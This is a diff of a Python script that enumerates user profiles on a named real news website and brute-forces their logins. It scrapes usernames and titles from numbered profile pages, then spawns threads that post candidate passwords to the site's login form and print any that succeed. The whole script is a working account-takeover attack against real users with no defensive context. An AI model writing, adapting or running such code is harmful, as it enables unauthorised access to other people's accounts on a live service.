@@ -1,6 +1,39 @@
 import sys
-from evaluate import *
-from output import *
+import requests
+import threading
+import time
+
+def output(entry):
+	number = 0
+	for item in entry:
+		sys.stdout.write(str(item) + \
+			" " * ([8, 32, 32, 8][number] - len(str(item))))
+		number += 1
+	sys.stdout.write("\n")
+
+def attempt(entry, passwords):
+	try:
+		for item in [entry[1], entry[2]] + passwords:
+			data = {"form_id": "user_login", "name": entry[1], "pass": item}
+			response = requests.post("http://zerohedge.com/user/", data).text
+			if "/user/password" not in response:
+				output(entry + [item])
+				exit()
+	except Exception as error: time.sleep(1)
+
+def evaluate(number, passwords):
+	try:
+		entry = [number]
+		response = requests.get("http://zerohedge.com/user/" + \
+			str(number)).text
+		if "Page Not Found" not in response:
+			entry.append(response[response.index("canonical") + \
+				48:response.index("og:url") - 21])
+			entry.append(response[response.index("<title>") + \
+				7:response.index(" | Zero Hedge")])
+			threading.Thread(target=attempt,
+				args=(entry, passwords)).start()
+	except Exception as error: pass
 
 def main(passwords):
 	output(["Number", "Username", "Title", "Password"])
